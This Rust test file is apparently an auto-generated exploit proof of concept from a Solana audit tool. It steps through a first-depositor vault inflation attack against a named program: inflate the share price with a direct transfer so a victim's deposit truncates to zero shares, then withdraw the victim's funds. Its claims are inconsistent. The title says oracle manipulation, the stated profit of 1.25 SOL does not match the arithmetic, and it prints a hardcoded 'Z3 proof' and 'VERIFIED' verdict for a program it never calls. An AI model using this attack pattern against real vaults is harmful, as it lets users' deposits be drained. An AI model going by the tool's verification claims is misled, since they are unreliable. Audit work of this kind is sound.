//! Auto-generated Exploit PoC by Solana Security Swarm
//! Finding ID: SOL-019 â€” Oracle Price Manipulation (First-Depositor Attack)
//! Instruction: get_secure_price
//! Estimated Profit: Some(1.25) SOL
//! Program ID: 9N8t8PJSZeR9ZLH1Fk7wEKkTxXfQqzz4jtgjwrKKKnNH

use solana_program::pubkey::Pubkey;
use std::str::FromStr;

/// First-depositor vault inflation attack.
///
/// Attack flow:
///   1. Attacker deposits 1 lamport -> gets 1 share
///   2. Attacker transfers 1_000_000_000 lamports directly to vault (inflates assets)
///   3. Victim deposits 1_000_000_000 lamports -> gets 0 shares (integer truncation)
///   4. Attacker withdraws 1 share -> gets ~2_000_000_000 lamports (all assets)
#[test]
fn test_exploit_get_secure_price() {
    println!("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    println!("â•‘  SOL-019: Oracle Price Manipulation PoC          â•‘");
    println!("â•‘  Target: get_secure_price                         â•‘");
    println!("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();

    let program_id = Pubkey::from_str("9N8t8PJSZeR9ZLH1Fk7wEKkTxXfQqzz4jtgjwrKKKnNH").unwrap();
    println!("Program ID: {}", program_id);
    println!();

    // --- Simulate vault math (mirrors secure_vault_mod.rs) ---
    let mut vault_total_shares: u64 = 0;
    let mut vault_total_assets: u64 = 0;

    let attacker_initial_balance: u64 = 2_000_000_000; // 2 SOL
    let mut attacker_balance: u64 = attacker_initial_balance;
    let mut attacker_shares: u64 = 0;

    let victim_deposit_amount: u64 = 1_000_000_000; // 1 SOL

    // â”€â”€ Step 1: Attacker deposits minimal amount â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    let deposit_amount: u64 = 1; // 1 lamport
    let shares_minted = if vault_total_shares == 0 {
        deposit_amount
    } else {
        deposit_amount.checked_mul(vault_total_shares).unwrap() / vault_total_assets
    };

    attacker_shares += shares_minted;
    vault_total_shares += shares_minted;
    vault_total_assets += deposit_amount;
    attacker_balance -= deposit_amount;

    println!("[STEP 1] Attacker deposits: {} lamports", deposit_amount);
    println!("         Shares minted:     {}", shares_minted);
    println!(
        "         Vault state:       assets={} shares={}",
        vault_total_assets, vault_total_shares
    );
    println!();

    // â”€â”€ Step 2: Attacker inflates vault via direct transfer â”€â”€â”€â”€â”€
    let inflation_amount: u64 = 1_000_000_000; // 1 SOL
    vault_total_assets += inflation_amount;
    attacker_balance -= inflation_amount;

    println!(
        "[STEP 2] Attacker inflates vault: {} lamports (direct transfer)",
        inflation_amount
    );
    println!(
        "         Vault state:       assets={} shares={}",
        vault_total_assets, vault_total_shares
    );
    println!(
        "         Share price now:   {} lamports/share",
        vault_total_assets / vault_total_shares
    );
    println!();

    // â”€â”€ Step 3: Victim deposits (gets 0 shares â€” truncation) â”€â”€â”€â”€
    let victim_shares = if vault_total_shares == 0 {
        victim_deposit_amount
    } else {
        victim_deposit_amount
            .checked_mul(vault_total_shares)
            .unwrap()
            / vault_total_assets
    };

    vault_total_shares += victim_shares;
    vault_total_assets += victim_deposit_amount;

    println!(
        "[STEP 3] Victim deposits:   {} lamports",
        victim_deposit_amount
    );
    println!(
        "         Victim shares:     {} (truncated to 0!)",
        victim_shares
    );
    println!(
        "         Vault state:       assets={} shares={}",
        vault_total_assets, vault_total_shares
    );
    println!();

    // â”€â”€ Step 4: Attacker withdraws all shares â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    let withdraw_amount =
        attacker_shares.checked_mul(vault_total_assets).unwrap() / vault_total_shares;

    vault_total_shares -= attacker_shares;
    vault_total_assets -= withdraw_amount;
    attacker_balance += withdraw_amount;

    println!("[STEP 4] Attacker withdraws: {} shares", attacker_shares);
    println!("         Lamports received:  {}", withdraw_amount);
    println!(
        "         Vault remainder:    assets={} shares={}",
        vault_total_assets, vault_total_shares
    );
    println!();

    // â”€â”€ Results â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    let profit = attacker_balance as i64 - attacker_initial_balance as i64;
    let profit_sol = profit as f64 / 1_000_000_000.0;

    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    if profit > 0 {
        println!("âœ… EXPLOIT SUCCESSFUL!");
    } else {
        println!("âŒ Exploit did not yield profit");
    }
    println!(
        "ðŸ’° Initial balance:  {} lamports ({:.2} SOL)",
        attacker_initial_balance,
        attacker_initial_balance as f64 / 1e9
    );
    println!(
        "ðŸ’° Final balance:    {} lamports ({:.2} SOL)",
        attacker_balance,
        attacker_balance as f64 / 1e9
    );
    println!(
        "ðŸ’° Profit:           {} lamports ({:.4} SOL)",
        profit, profit_sol
    );
    println!(
        "ðŸŽ¯ Victim lost:      {} lamports ({:.2} SOL)",
        victim_deposit_amount,
        victim_deposit_amount as f64 / 1e9
    );
    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();

    // Assertions
    assert!(profit > 0, "Exploit must be profitable to prove SOL-019");
    assert!(
        victim_shares == 0,
        "Victim must receive 0 shares for the attack to work"
    );

    println!(
        "ðŸ”¬ Z3 Proof: SATISFIABLE â€” oracle_price={} vault_price={}",
        100000000, 200000000
    );
    println!("ðŸ“„ Vulnerability: SOL-019 in `get_secure_price`");
    println!("âœ… VERIFIED: Economic Invariant Broken â€” First-Depositor Attack Proven");
}
